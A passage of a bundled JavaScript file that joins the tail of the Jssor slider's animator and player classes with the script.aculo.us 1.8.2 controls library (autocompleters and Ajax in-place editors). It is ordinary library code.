        return _Position_InnerBegin;
    };

    _ThisAnimator.$GetPosition_InnerEnd = function () {
        ///	<summary>
        ///		Internal member function, do not use it.
        ///	</summary>
        ///	<private />
        ///	<returns type="int" />
        return _Position_InnerEnd;
    };

    _ThisAnimator.$GetPosition_OuterBegin = function () {
        ///	<summary>
        ///		Internal member function, do not use it.
        ///	</summary>
        ///	<private />
        ///	<returns type="int" />
        return _Position_OuterBegin;
    };

    _ThisAnimator.$GetPosition_OuterEnd = function () {
        ///	<summary>
        ///		Internal member function, do not use it.
        ///	</summary>
        ///	<private />
        ///	<returns type="int" />
        return _Position_OuterEnd;
    };

    _ThisAnimator.$OnPositionChange = _ThisAnimator.$OnStart = _ThisAnimator.$OnStop = _ThisAnimator.$OnInnerOffsetChange = $Jssor$.$EmptyFunction;
    _ThisAnimator.$Version = $Jssor$.$GetNow();

    //Constructor  1
    {
        options = $Jssor$.$Extend({
            $Interval: 16,
            $IntervalMax: 50
        }, options);

        //Sodo statement, for development time intellisence only
        $JssorDebug$.$Execute(function () {
            options = $Jssor$.$Extend({
                $LoopLength: undefined,
                $Setter: undefined,
                $Easing: undefined
            }, options);
        });

        _LoopLength = options.$LoopLength;

        _StyleSetter = $Jssor$.$Extend({}, $Jssor$.$StyleSetter(), options.$Setter);

        _Position_OuterBegin = _Position_InnerBegin = delay;
        _Position_OuterEnd = _Position_InnerEnd = delay + duration;

        _SubRounds = options.$Round || {};
        _SubDurings = options.$During || {};
        _SubEasings = $Jssor$.$Extend({ $Default: $Jssor$.$IsFunction(options.$Easing) && options.$Easing || $JssorEasing$.$EaseSwing }, options.$Easing);
    }
};

function $JssorPlayerClass$() {

    var _ThisPlayer = this;
    var _PlayerControllers = [];

    function PlayerController(playerElement) {
        var _SelfPlayerController = this;
        var _PlayerInstance;
        var _PlayerInstantces = [];

        function OnPlayerInstanceDataAvailable(event) {
            var srcElement = $Jssor$.$EventSrc(event);
            _PlayerInstance = srcElement.pInstance;

            $Jssor$.$RemoveEvent(srcElement, "dataavailable", OnPlayerInstanceDataAvailable);
            $Jssor$.$Each(_PlayerInstantces, function (playerInstance) {
                if (playerInstance != _PlayerInstance) {
                    playerInstance.$Remove();
                }
            });

            playerElement.pTagName = _PlayerInstance.tagName;
            _PlayerInstantces = null;
        }

        function HandlePlayerInstance(playerInstanceElement) {
            var playerHandler;

            if (!playerInstanceElement.pInstance) {
                var playerHandlerAttribute = $Jssor$.$AttributeEx(playerInstanceElement, "pHandler");

                if ($JssorPlayer$[playerHandlerAttribute]) {
                    $Jssor$.$AddEvent(playerInstanceElement, "dataavailable", OnPlayerInstanceDataAvailable);
                    playerHandler = new $JssorPlayer$[playerHandlerAttribute](playerElement, playerInstanceElement);
                    _PlayerInstantces.push(playerHandler);

                    $JssorDebug$.$Execute(function () {
                        if ($Jssor$.$Type(playerHandler.$Remove) != "function") {
                            $JssorDebug$.$Fail("'pRemove' interface not implemented for player handler '" + playerHandlerAttribute + "'.");
                        }
                    });
                }
            }

            return playerHandler;
        }

        _SelfPlayerController.$InitPlayerController = function () {
            if (!playerElement.pInstance && !HandlePlayerInstance(playerElement)) {

                var playerInstanceElements = $Jssor$.$Children(playerElement);

                $Jssor$.$Each(playerInstanceElements, function (playerInstanceElement) {
                    HandlePlayerInstance(playerInstanceElement);
                });
            }
        };
    }

    _ThisPlayer.$EVT_SWITCH = 21;

    _ThisPlayer.$FetchPlayers = function (elmt) {
        elmt = elmt || document.body;

        var playerElements = $Jssor$.$FindChildren(elmt, "player");

        $Jssor$.$Each(playerElements, function (playerElement) {
            if (!_PlayerControllers[playerElement.pId]) {
                playerElement.pId = _PlayerControllers.length;
                _PlayerControllers.push(new PlayerController(playerElement));
            }
            var playerController = _PlayerControllers[playerElement.pId];
            playerController.$InitPlayerController();
        });
    };
}
// script.aculo.us controls.js v1.8.2, Tue Nov 18 18:30:58 +0100 2008

// Copyright (c) 2005-2008 Thomas Fuchs (http://script.aculo.us, http://mir.aculo.us)
//           (c) 2005-2008 Ivan Krstic (http://blogs.law.harvard.edu/ivan)
//           (c) 2005-2008 Jon Tirsen (http://www.tirsen.com)
// Contributors:
//  Richard Livsey
//  Rahul Bhargava
//  Rob Wills
//
// script.aculo.us is freely distributable under the terms of an MIT-style license.
// For details, see the script.aculo.us web site: http://script.aculo.us/

// Autocompleter.Base handles all the autocompletion functionality
// that's independent of the data source for autocompletion. This
// includes drawing the autocompletion menu, observing keyboard
// and mouse events, and similar.
//
// Specific autocompleters need to provide, at the very least,
// a getUpdatedChoices function that will be invoked every time
// the text inside the monitored textbox changes. This method
// should get the text for which to provide autocompletion by
// invoking this.getToken(), NOT by directly accessing
// this.element.value. This is to allow incremental tokenized
// autocompletion. Specific auto-completion logic (AJAX, etc)
// belongs in getUpdatedChoices.
//
// Tokenized incremental autocompletion is enabled automatically
// when an autocompleter is instantiated with the 'tokens' option
// in the options parameter, e.g.:
// new Ajax.Autocompleter('id','upd', '/url/', { tokens: ',' });
// will incrementally autocomplete with a comma as the token.
// Additionally, ',' in the above example can be replaced with
// a token array, e.g. { tokens: [',', '\n'] } which
// enables autocompletion on multiple tokens. This is most
// useful when one of the tokens is \n (a newline), as it
// allows smart autocompletion after linebreaks.

if(typeof Effect == 'undefined')
  throw("controls.js requires including script.aculo.us' effects.js library");

var Autocompleter = { };
Autocompleter.Base = Class.create({
  baseInitialize: function(element, update, options) {
    element          = $(element);
    this.element     = element;
    this.update      = $(update);
    this.hasFocus    = false;
    this.changed     = false;
    this.active      = false;
    this.index       = 0;
    this.entryCount  = 0;
    this.oldElementValue = this.element.value;

    if(this.setOptions)
      this.setOptions(options);
    else
      this.options = options || { };

    this.options.paramName    = this.options.paramName || this.element.name;
    this.options.tokens       = this.options.tokens || [];
    this.options.frequency    = this.options.frequency || 0.4;
    this.options.minChars     = this.options.minChars || 1;
    this.options.onShow       = this.options.onShow ||
      function(element, update){
        if(!update.style.position || update.style.position=='absolute') {
          update.style.position = 'absolute';
          Position.clone(element, update, {
            setHeight: false,
            offsetTop: element.offsetHeight
          });
        }
        Effect.Appear(update,{duration:0.15});
      };
    this.options.onHide = this.options.onHide ||
      function(element, update){ new Effect.Fade(update,{duration:0.15}) };

    if(typeof(this.options.tokens) == 'string')
      this.options.tokens = new Array(this.options.tokens);
    // Force carriage returns as token delimiters anyway
    if (!this.options.tokens.include('\n'))
      this.options.tokens.push('\n');

    this.observer = null;

    this.element.setAttribute('autocomplete','off');

    Element.hide(this.update);

    Event.observe(this.element, 'blur', this.onBlur.bindAsEventListener(this));
    Event.observe(this.element, 'keydown', this.onKeyPress.bindAsEventListener(this));
  },

  show: function() {
    if(Element.getStyle(this.update, 'display')=='none') this.options.onShow(this.element, this.update);
    if(!this.iefix &&
      (Prototype.Browser.IE) &&
      (Element.getStyle(this.update, 'position')=='absolute')) {
      new Insertion.After(this.update,
       '<iframe id="' + this.update.id + '_iefix" '+
       'style="display:none;position:absolute;filter:progid:DXImageTransform.Microsoft.Alpha(opacity=0);" ' +
       'src="javascript:false;" frameborder="0" scrolling="no"></iframe>');
      this.iefix = $(this.update.id+'_iefix');
    }
    if(this.iefix) setTimeout(this.fixIEOverlapping.bind(this), 50);
  },

  fixIEOverlapping: function() {
    Position.clone(this.update, this.iefix, {setTop:(!this.update.style.height)});
    this.iefix.style.zIndex = 1;
    this.update.style.zIndex = 2;
    Element.show(this.iefix);
  },

  hide: function() {
    this.stopIndicator();
    if(Element.getStyle(this.update, 'display')!='none') this.options.onHide(this.element, this.update);
    if(this.iefix) Element.hide(this.iefix);
  },

  startIndicator: function() {
    if(this.options.indicator) Element.show(this.options.indicator);
  },

  stopIndicator: function() {
    if(this.options.indicator) Element.hide(this.options.indicator);
  },

  onKeyPress: function(event) {
    if(this.active)
      switch(event.keyCode) {
       case Event.KEY_TAB:
       case Event.KEY_RETURN:
         this.selectEntry();
         Event.stop(event);
       case Event.KEY_ESC:
         this.hide();
         this.active = false;
         Event.stop(event);
         return;
       case Event.KEY_LEFT:
       case Event.KEY_RIGHT:
         return;
       case Event.KEY_UP:
         this.markPrevious();
         this.render();
         Event.stop(event);
         return;
       case Event.KEY_DOWN:
         this.markNext();
         this.render();
         Event.stop(event);
         return;
      }
     else
       if(event.keyCode==Event.KEY_TAB || event.keyCode==Event.KEY_RETURN ||
         (Prototype.Browser.WebKit > 0 && event.keyCode == 0)) return;

    this.changed = true;
    this.hasFocus = true;

    if(this.observer) clearTimeout(this.observer);
      this.observer =
        setTimeout(this.onObserverEvent.bind(this), this.options.frequency*1000);
  },

  activate: function() {
    this.changed = false;
    this.hasFocus = true;
    this.getUpdatedChoices();
  },

  onHover: function(event) {
    var element = Event.findElement(event, 'LI');
    if(this.index != element.autocompleteIndex)
    {
        this.index = element.autocompleteIndex;
        this.render();
    }
    Event.stop(event);
  },

  onClick: function(event) {
    var element = Event.findElement(event, 'LI');
    this.index = element.autocompleteIndex;
    this.selectEntry();
    this.hide();
  },

  onBlur: function(event) {
    // needed to make click events working
    setTimeout(this.hide.bind(this), 250);
    this.hasFocus = false;
    this.active = false;
  },

  render: function() {
    if(this.entryCount > 0) {
      for (var i = 0; i < this.entryCount; i++)
        this.index==i ?
          Element.addClassName(this.getEntry(i),"selected") :
          Element.removeClassName(this.getEntry(i),"selected");
      if(this.hasFocus) {
        this.show();
        this.active = true;
      }
    } else {
      this.active = false;
      this.hide();
    }
  },

  markPrevious: function() {
    if(this.index > 0) this.index--;
      else this.index = this.entryCount-1;
    //this.getEntry(this.index).scrollIntoView(true); useless
  },

  markNext: function() {
    if(this.index < this.entryCount-1) this.index++;
      else this.index = 0;
    this.getEntry(this.index).scrollIntoView(false);
  },

  getEntry: function(index) {
    return this.update.firstChild.childNodes[index];
  },

  getCurrentEntry: function() {
    return this.getEntry(this.index);
  },

  selectEntry: function() {
    this.active = false;
    this.updateElement(this.getCurrentEntry());
  },

  updateElement: function(selectedElement) {
    if (this.options.updateElement) {
      this.options.updateElement(selectedElement);
      return;
    }
    var value = '';
    if (this.options.select) {
      var nodes = $(selectedElement).select('.' + this.options.select) || [];
      if(nodes.length>0) value = Element.collectTextNodes(nodes[0], this.options.select);
    } else
      value = Element.collectTextNodesIgnoreClass(selectedElement, 'informal');

    var bounds = this.getTokenBounds();
    if (bounds[0] != -1) {
      var newValue = this.element.value.substr(0, bounds[0]);
      var whitespace = this.element.value.substr(bounds[0]).match(/^\s+/);
      if (whitespace)
        newValue += whitespace[0];
      this.element.value = newValue + value + this.element.value.substr(bounds[1]);
    } else {
      this.element.value = value;
    }
    this.oldElementValue = this.element.value;
    this.element.focus();

    if (this.options.afterUpdateElement)
      this.options.afterUpdateElement(this.element, selectedElement);
  },

  updateChoices: function(choices) {
    if(!this.changed && this.hasFocus) {
      this.update.innerHTML = choices;
      Element.cleanWhitespace(this.update);
      Element.cleanWhitespace(this.update.down());

      if(this.update.firstChild && this.update.down().childNodes) {
        this.entryCount =
          this.update.down().childNodes.length;
        for (var i = 0; i < this.entryCount; i++) {
          var entry = this.getEntry(i);
          entry.autocompleteIndex = i;
          this.addObservers(entry);
        }
      } else {
        this.entryCount = 0;
      }

      this.stopIndicator();
      this.index = 0;

      if(this.entryCount==1 && this.options.autoSelect) {
        this.selectEntry();
        this.hide();
      } else {
        this.render();
      }
    }
  },

  addObservers: function(element) {
    Event.observe(element, "mouseover", this.onHover.bindAsEventListener(this));
    Event.observe(element, "click", this.onClick.bindAsEventListener(this));
  },

  onObserverEvent: function() {
    this.changed = false;
    this.tokenBounds = null;
    if(this.getToken().length>=this.options.minChars) {
      this.getUpdatedChoices();
    } else {
      this.active = false;
      this.hide();
    }
    this.oldElementValue = this.element.value;
  },

  getToken: function() {
    var bounds = this.getTokenBounds();
    return this.element.value.substring(bounds[0], bounds[1]).strip();
  },

  getTokenBounds: function() {
    if (null != this.tokenBounds) return this.tokenBounds;
    var value = this.element.value;
    if (value.strip().empty()) return [-1, 0];
    var diff = arguments.callee.getFirstDifferencePos(value, this.oldElementValue);
    var offset = (diff == this.oldElementValue.length ? 1 : 0);
    var prevTokenPos = -1, nextTokenPos = value.length;
    var tp;
    for (var index = 0, l = this.options.tokens.length; index < l; ++index) {
      tp = value.lastIndexOf(this.options.tokens[index], diff + offset - 1);
      if (tp > prevTokenPos) prevTokenPos = tp;
      tp = value.indexOf(this.options.tokens[index], diff + offset);
      if (-1 != tp && tp < nextTokenPos) nextTokenPos = tp;
    }
    return (this.tokenBounds = [prevTokenPos + 1, nextTokenPos]);
  }
});

Autocompleter.Base.prototype.getTokenBounds.getFirstDifferencePos = function(newS, oldS) {
  var boundary = Math.min(newS.length, oldS.length);
  for (var index = 0; index < boundary; ++index)
    if (newS[index] != oldS[index])
      return index;
  return boundary;
};

Ajax.Autocompleter = Class.create(Autocompleter.Base, {
  initialize: function(element, update, url, options) {
    this.baseInitialize(element, update, options);
    this.options.asynchronous  = true;
    this.options.onComplete    = this.onComplete.bind(this);
    this.options.defaultParams = this.options.parameters || null;
    this.url                   = url;
  },

  getUpdatedChoices: function() {
    this.startIndicator();

    var entry = encodeURIComponent(this.options.paramName) + '=' +
      encodeURIComponent(this.getToken());

    this.options.parameters = this.options.callback ?
      this.options.callback(this.element, entry) : entry;

    if(this.options.defaultParams)
      this.options.parameters += '&' + this.options.defaultParams;

    new Ajax.Request(this.url, this.options);
  },

  onComplete: function(request) {
    this.updateChoices(request.responseText);
  }
});

// The local array autocompleter. Used when you'd prefer to
// inject an array of autocompletion options into the page, rather
// than sending out Ajax queries, which can be quite slow sometimes.
//
// The constructor takes four parameters. The first two are, as usual,
// the id of the monitored textbox, and id of the autocompletion menu.
// The third is the array you want to autocomplete from, and the fourth
// is the options block.
//
// Extra local autocompletion options:
// - choices - How many autocompletion choices to offer
//
// - partialSearch - If false, the autocompleter will match entered
//                    text only at the beginning of strings in the
//                    autocomplete array. Defaults to true, which will
//                    match text at the beginning of any *word* in the
//                    strings in the autocomplete array. If you want to
//                    search anywhere in the string, additionally set
//                    the option fullSearch to true (default: off).
//
// - fullSsearch - Search anywhere in autocomplete array strings.
//
// - partialChars - How many characters to enter before triggering
//                   a partial match (unlike minChars, which defines
//                   how many characters are required to do any match
//                   at all). Defaults to 2.
//
// - ignoreCase - Whether to ignore case when autocompleting.
//                 Defaults to true.
//
// It's possible to pass in a custom function as the 'selector'
// option, if you prefer to write your own autocompletion logic.
// In that case, the other options above will not apply unless
// you support them.

Autocompleter.Local = Class.create(Autocompleter.Base, {
  initialize: function(element, update, array, options) {
    this.baseInitialize(element, update, options);
    this.options.array = array;
  },

  getUpdatedChoices: function() {
    this.updateChoices(this.options.selector(this));
  },

  setOptions: function(options) {
    this.options = Object.extend({
      choices: 10,
      partialSearch: true,
      partialChars: 2,
      ignoreCase: true,
      fullSearch: false,
      selector: function(instance) {
        var ret       = []; // Beginning matches
        var partial   = []; // Inside matches
        var entry     = instance.getToken();
        var count     = 0;

        for (var i = 0; i < instance.options.array.length &&
          ret.length < instance.options.choices ; i++) {

          var elem = instance.options.array[i];
          var foundPos = instance.options.ignoreCase ?
            elem.toLowerCase().indexOf(entry.toLowerCase()) :
            elem.indexOf(entry);

          while (foundPos != -1) {
            if (foundPos == 0 && elem.length != entry.length) {
              ret.push("<li><strong>" + elem.substr(0, entry.length) + "</strong>" +
                elem.substr(entry.length) + "</li>");
              break;
            } else if (entry.length >= instance.options.partialChars &&
              instance.options.partialSearch && foundPos != -1) {
              if (instance.options.fullSearch || /\s/.test(elem.substr(foundPos-1,1))) {
                partial.push("<li>" + elem.substr(0, foundPos) + "<strong>" +
                  elem.substr(foundPos, entry.length) + "</strong>" + elem.substr(
                  foundPos + entry.length) + "</li>");
                break;
              }
            }

            foundPos = instance.options.ignoreCase ?
              elem.toLowerCase().indexOf(entry.toLowerCase(), foundPos + 1) :
              elem.indexOf(entry, foundPos + 1);

          }
        }
        if (partial.length)
          ret = ret.concat(partial.slice(0, instance.options.choices - ret.length));
        return "<ul>" + ret.join('') + "</ul>";
      }
    }, options || { });
  }
});

// AJAX in-place editor and collection editor
// Full rewrite by Christophe Porteneuve <tdd@tddsworld.com> (April 2007).

// Use this if you notice weird scrolling problems on some browsers,
// the DOM might be a bit confused when this gets called so do this
// waits 1 ms (with setTimeout) until it does the activation
Field.scrollFreeActivate = function(field) {
  setTimeout(function() {
    Field.activate(field);
  }, 1);
};

Ajax.InPlaceEditor = Class.create({
  initialize: function(element, url, options) {
    this.url = url;
    this.element = element = $(element);
    this.prepareOptions();
    this._controls = { };
    arguments.callee.dealWithDeprecatedOptions(options); // DEPRECATION LAYER!!!
    Object.extend(this.options, options || { });
    if (!this.options.formId && this.element.id) {
      this.options.formId = this.element.id + '-inplaceeditor';
      if ($(this.options.formId))
        this.options.formId = '';
    }
    if (this.options.externalControl)
      this.options.externalControl = $(this.options.externalControl);
    if (!this.options.externalControl)
      this.options.externalControlOnly = false;
    this._originalBackground = this.element.getStyle('background-color') || 'transparent';
    this.element.title = this.options.clickToEditText;
    this._boundCancelHandler = this.handleFormCancellation.bind(this);
    this._boundComplete = (this.options.onComplete || Prototype.emptyFunction).bind(this);
    this._boundFailureHandler = this.handleAJAXFailure.bind(this);
    this._boundSubmitHandler = this.handleFormSubmission.bind(this);
    this._boundWrapperHandler = this.wrapUp.bind(this);
    this.registerListeners();
  },
  checkForEscapeOrReturn: function(e) {
    if (!this._editing || e.ctrlKey || e.altKey || e.shiftKey) return;
    if (Event.KEY_ESC == e.keyCode)
      this.handleFormCancellation(e);
    else if (Event.KEY_RETURN == e.keyCode)
      this.handleFormSubmission(e);
  },
  createControl: function(mode, handler, extraClasses) {
    var control = this.options[mode + 'Control'];
    var text = this.options[mode + 'Text'];
    if ('button' == control) {
      var btn = document.createElement('input');
      btn.type = 'submit';
      btn.value = text;
      btn.className = 'editor_' + mode + '_button';
      if ('cancel' == mode)
        btn.onclick = this._boundCancelHandler;
      this._form.appendChild(btn);
      this._controls[mode] = btn;
    } else if ('link' == control) {
      var link = document.createElement('a');
      link.href = '#';
      link.appendChild(document.createTextNode(text));
      link.onclick = 'cancel' == mode ? this._boundCancelHandler : this._boundSubmitHandler;
      link.className = 'editor_' + mode + '_link';
      if (extraClasses)
        link.className += ' ' + extraClasses;
      this._form.appendChild(link);
      this._controls[mode] = link;
    }
  },
  createEditField: function() {
    var text = (this.options.loadTextURL ? this.options.loadingText : this.getText());
    var fld;
    if (1 >= this.options.rows && !/\r|\n/.test(this.getText())) {
      fld = document.createElement('input');
      fld.type = 'text';
      var size = this.options.size || this.options.cols || 0;
      if (0 < size) fld.size = size;
    } else {
      fld = document.createElement('textarea');
      fld.rows = (1 >= this.options.rows ? this.options.autoRows : this.options.rows);
      fld.cols = this.options.cols || 40;
    }
    fld.name = this.options.paramName;
    fld.value = text; // No HTML breaks conversion anymore
    fld.className = 'editor_field';
    if (this.options.submitOnBlur)
      fld.onblur = this._boundSubmitHandler;
    this._controls.editor = fld;
    if (this.options.loadTextURL)
      this.loadExternalText();
    this._form.appendChild(this._controls.editor);
  },
  createForm: function() {
    var ipe = this;
    function addText(mode, condition) {
      var text = ipe.options['text' + mode + 'Controls'];
      if (!text || condition === false) return;
      ipe._form.appendChild(document.createTextNode(text));
    };
    this._form = $(document.createElement('form'));
    this._form.id = this.options.formId;
    this._form.addClassName(this.options.formClassName);
    this._form.onsubmit = this._boundSubmitHandler;
    this.createEditField();
    if ('textarea' == this._controls.editor.tagName.toLowerCase())
      this._form.appendChild(document.createElement('br'));
    if (this.options.onFormCustomization)
      this.options.onFormCustomization(this, this._form);
    addText('Before', this.options.okControl || this.options.cancelControl);
    this.createControl('ok', this._boundSubmitHandler);
    addText('Between', this.options.okControl && this.options.cancelControl);
    this.createControl('cancel', this._boundCancelHandler, 'editor_cancel');
    addText('After', this.options.okControl || this.options.cancelControl);
  },
  destroy: function() {
    if (this._oldInnerHTML)
      this.element.innerHTML = this._oldInnerHTML;
    this.leaveEditMode();
    this.unregisterListeners();
  },
  enterEditMode: function(e) {
    if (this._saving || this._editing) return;
    this._editing = true;
    this.triggerCallback('onEnterEditMode');
    if (this.options.externalControl)
      this.options.externalControl.hide();
    this.element.hide();
    this.createForm();
    this.element.parentNode.insertBefore(this._form, this.element);
    if (!this.options.loadTextURL)
      this.postProcessEditField();
    if (e) Event.stop(e);
  },
  enterHover: function(e) {
    if (this.options.hoverClassName)
      this.element.addClassName(this.options.hoverClassName);
    if (this._saving) return;
    this.triggerCallback('onEnterHover');
  },
  getText: function() {
    return this.element.innerHTML.unescapeHTML();
  },
  handleAJAXFailure: function(transport) {
    this.triggerCallback('onFailure', transport);
    if (this._oldInnerHTML) {
      this.element.innerHTML = this._oldInnerHTML;
      this._oldInnerHTML = null;
    }
  },
  handleFormCancellation: function(e) {
    this.wrapUp();
    if (e) Event.stop(e);
  },
  handleFormSubmission: function(e) {
    var form = this._form;
    var value = $F(this._controls.editor);
    this.prepareSubmission();
    var params = this.options.callback(form, value) || '';
    if (Object.isString(params))
      params = params.toQueryParams();
    params.editorId = this.element.id;
    if (this.options.htmlResponse) {
      var options = Object.extend({ evalScripts: true }, this.options.ajaxOptions);
      Object.extend(options, {
        parameters: params,
        onComplete: this._boundWrapperHandler,
        onFailure: this._boundFailureHandler
      });
      new Ajax.Updater({ success: this.element }, this.url, options);
    } else {
      var options = Object.extend({ method: 'get' }, this.options.ajaxOptions);
      Object.extend(options, {
        parameters: params,
        onComplete: this._boundWrapperHandler,
        onFailure: this._boundFailureHandler
      });
      new Ajax.Request(this.url, options);
    }
    if (e) Event.stop(e);
  },
  leaveEditMode: function() {
    this.element.removeClassName(this.options.savingClassName);
    this.removeForm();
    this.leaveHover();
    this.element.style.backgroundColor = this._originalBackground;
    this.element.show();
    if (this.options.externalControl)
      this.options.externalControl.show();
    this._saving = false;
    this._editing = false;
    this._oldInnerHTML = null;
    this.triggerCallback('onLeaveEditMode');
  },
  leaveHover: function(e) {
    if (this.options.hoverClassName)
      this.element.removeClassName(this.options.hoverClassName);
    if (this._saving) return;
    this.triggerCallback('onLeaveHover');
  },
  loadExternalText: function() {
    this._form.addClassName(this.options.loadingClassName);
    this._controls.editor.disabled = true;
    var options = Object.extend({ method: 'get' }, this.options.ajaxOptions);
    Object.extend(options, {
      parameters: 'editorId=' + encodeURIComponent(this.element.id),
      onComplete: Prototype.emptyFunction,
      onSuccess: function(transport) {
        this._form.removeClassName(this.options.loadingClassName);
        var text = transport.responseText;
        if (this.options.stripLoadedTextTags)
          text = text.stripTags();
        this._controls.editor.value = text;
        this._controls.editor.disabled = false;
        this.postProcessEditField();
      }.bind(this),
      onFailure: this._boundFailureHandler
    });
    new Ajax.Request(this.options.loadTextURL, options);
  },
  postProcessEditField: function() {
    var fpc = this.options.fieldPostCreation;
    if (fpc)
      $(this._controls.editor)['focus' == fpc ? 'focus' : 'activate']();
  },
  prepareOptions: function() {
    this.options = Object.clone(Ajax.InPlaceEditor.DefaultOptions);
    Object.extend(this.options, Ajax.InPlaceEditor.DefaultCallbacks);
    [this._extraDefaultOptions].flatten().compact().each(function(defs) {
      Object.extend(this.options, defs);
    }.bind(this));
  },
  prepareSubmission: function() {
    this._saving = true;
    this.removeForm();
    this.leaveHover();
    this.showSaving();
  },
  registerListeners: function() {
    this._listeners = { };
    var listener;
    $H(Ajax.InPlaceEditor.Listeners).each(function(pair) {
      listener = this[pair.value].bind(this);
      this._listeners[pair.key] = listener;
      if (!this.options.externalControlOnly)
        this.element.observe(pair.key, listener);
      if (this.options.externalControl)
        this.options.externalControl.observe(pair.key, listener);
    }.bind(this));
  },
  removeForm: function() {
    if (!this._form) return;
    this._form.remove();
    this._form = null;
    this._controls = { };
  },
  showSaving: function() {
    this._oldInnerHTML = this.element.innerHTML;
    this.element.innerHTML = this.options.savingText;
    this.element.addClassName(this.options.savingClassName);
    this.element.style.backgroundColor = this._originalBackground;
    this.element.show();
  },
  triggerCallback: function(cbName, arg) {
    if ('function' == typeof this.options[cbName]) {
      this.options[cbName](this, arg);
    }
  },
  unregisterListeners: function() {
    $H(this._listeners).each(function(pair) {
      if (!this.options.externalControlOnly)
        this.element.stopObserving(pair.key, pair.value);
      if (this.options.externalControl)
        this.options.externalControl.stopObserving(pair.key, pair.value);
    }.bind(this));
  },
  wrapUp: function(transport) {
    this.leaveEditMode();
    // Can't use triggerCallback due to backward compatibility: requires
    // binding + direct element
    this._boundComplete(transport, this.element);
  }
});

Object.extend(Ajax.InPlaceEditor.prototype, {
  dispose: Ajax.InPlaceEditor.prototype.destroy
});

Ajax.InPlaceCollectionEditor = Class.create(Ajax.InPlaceEditor, {
  initialize: function($super, element, url, options) {
    this._extraDefaultOptions = Ajax.InPlaceCollectionEditor.DefaultOptions;
    $super(element, url, options);
  },

  createEditField: function() {
    var list = document.createElement('select');
    list.name = this.options.paramName;
    list.size = 1;
    this._controls.editor = list;
    this._collection = this.options.collection || [];
    if (this.options.loadCollectionURL)
      this.loadCollection();
    else
      this.checkForExternalText();
    this._form.appendChild(this._controls.editor);
  },

  loadCollection: function() {
    this._form.addClassName(this.options.loadingClassName);
    this.showLoadingText(this.options.loadingCollectionText);
    var options = Object.extend({ method: 'get' }, this.options.ajaxOptions);
    Object.extend(options, {
      parameters: 'editorId=' + encodeURIComponent(this.element.id),
      onComplete: Prototype.emptyFunction,
      onSuccess: function(transport) {
        var js = transport.responseText.strip();
        if (!/^\[.*\]$/.test(js)) // TODO: improve sanity check
          throw('Server returned an invalid collection representation.');
        this._collection = eval(js);
        this.checkForExternalText();
      }.bind(this),
      onFailure: this.onFailure
    });
    new Ajax.Request(this.options.loadCollectionURL, options);
  },

  showLoadingText: function(text) {
    this._controls.editor.disabled = true;
    var tempOption = this._controls.editor.firstChild;
    if (!tempOption) {
      tempOption = document.createElement('option');
      tempOption.value = '';
      this._controls.editor.appendChild(tempOption);
      tempOption.selected = true;
    }
    tempOption.update((text || '').stripScripts().stripTags());
  },

  checkForExternalText: function() {
    this._text = this.getText();
    if (this.options.loadTextURL)
      this.loadExternalText();
    else
      this.buildOptionList();
  },

  loadExternalText: function() {
    this.showLoadingText(this.options.loadingText);
    var options = Object.extend({ method: 'get' }, this.options.ajaxOptions);
    Object.extend(options, {
      parameters: 'editorId=' + encodeURIComponent(this.element.id),
      onComplete: Prototype.emptyFunction,
      onSuccess: function(transport) {
        this._text = transport.responseText.strip();
        this.buildOptionList();
      }.bind(this),
      onFailure: this.onFailure
    });
    new Ajax.Request(this.options.loadTextURL, options);
  },

  buildOptionList: function() {
    this._form.removeClassName(this.options.loadingClassName);
    this._collection = this._collection.map(function(entry) {
      return 2 === entry.length ? entry : [entry, entry].flatten();
    });
    var marker = ('value' in this.options) ? this.options.value : this._text;
    var textFound = this._collection.any(function(entry) {
      return entry[0] == marker;
    }.bind(this));
    this._controls.editor.update('');
    var option;
    this._collection.each(function(entry, index) {
      option = document.createElement('option');
      option.value = entry[0];
      option.selected = textFound ? entry[0] == marker : 0 == index;
      option.appendChild(document.createTextNode(entry[1]));
      this._controls.editor.appendChild(option);
    }.bind(this));
    this._controls.editor.disabled = false;
    Field.scrollFreeActivate(this._controls.editor);
  }
});

//**** DEPRECATION LAYER FOR InPlace[Collection]Editor! ****
//**** This only  exists for a while,  in order to  let ****
//**** users adapt to  the new API.  Read up on the new ****
//**** API and convert your code to it ASAP!            ****

Ajax.InPlaceEditor.prototype.initialize.dealWithDeprecatedOptions = function(options) {
  if (!options) return;
  function fallback(name, expr) {
    if (name in options || expr === undefined) return;
    options[name] = expr;
  };
  fallback('cancelControl', (options.cancelLink ? 'link' : (options.cancelButton ? 'button' :
    options.cancelLink == options.cancelButton == false ? false : undefined)));
  fallback('okControl', (options.okLink ? 'link' : (options.okButton ? 'button' :
    options.okLink == options.okButton == false ? false : undefined)));
  fallback('highlightColor', options.highlightcolor);
  fallback('highlightEndColor', options.highlightendcolor);
};

Object.extend(Ajax.InPlaceEditor, {
  DefaultOptions: {
    ajaxOptions: { },
    autoRows: 3,                                // Use when multi-line w/ rows == 1
    cancelControl: 'link',                      // 'link'|'button'|false
    cancelText: 'cancel',
    clickToEditText: 'Click to edit',
    externalControl: null,                      // id|elt
    externalControlOnly: false,
    fieldPostCreation: 'activate',              // 'activate'|'focus'|false
    formClassName: 'inplaceeditor-form',
    formId: null,                               // id|elt
    highlightColor: '#ffff99',
    highlightEndColor: '#ffffff',
    hoverClassName: '',
    htmlResponse: true,
    loadingClassName: 'inplaceeditor-loading',
    loadingText: 'Loading...',
    okControl: 'button',                        // 'link'|'button'|false
    okText: 'ok',
    paramName: 'value',
    rows: 1,                                    // If 1 and multi-line, uses autoRows
    savingClassName: 'inplaceeditor-saving',
    savingText: 'Saving...',
    size: 0,
    stripLoadedTextTags: false,
    submitOnBlur: false,
    textAfterControls: '',
    textBeforeControls: '',
    textBetweenControls: ''
  },
  DefaultCallbacks: {
    callback: function(form) {
      return Form.serialize(form);
    },
    onComplete: function(transport, element) {
      // For backward compatibility, this one is bound to the IPE, and passes
      // the element directly.  It was too often customized, so we don't break it.
      new Effect.Highlight(element, {
        startcolor: this.options.highlightColor, keepBackgroundImage: true });
    },
    onEnterEditMode: null,
    onEnterHover: function(ipe) {
      ipe.element.style.backgroundColor = ipe.options.highlightColor;
      if (ipe._effect)
        ipe._effect.cancel();
    },
    onFailure: function(transport, ipe) {
      alert('Error communication with the server: ' + transport.responseText.stripTags());
    },
    onFormCustomization: null, // Takes the IPE and its generated form, after editor, before controls.
    onLeaveEditMode: null,
    onLeaveHover: function(ipe) {
      ipe._effect = new Effect.Highlight(ipe.element, {
        startcolor: ipe.options.highlightColor, endcolor: ipe.options.highlightEndColor,
        restorecolor: ipe._originalBackground, keepBackgroundImage: true
      });
    }
  },
  Listeners: {
    click: 'enterEditMode',
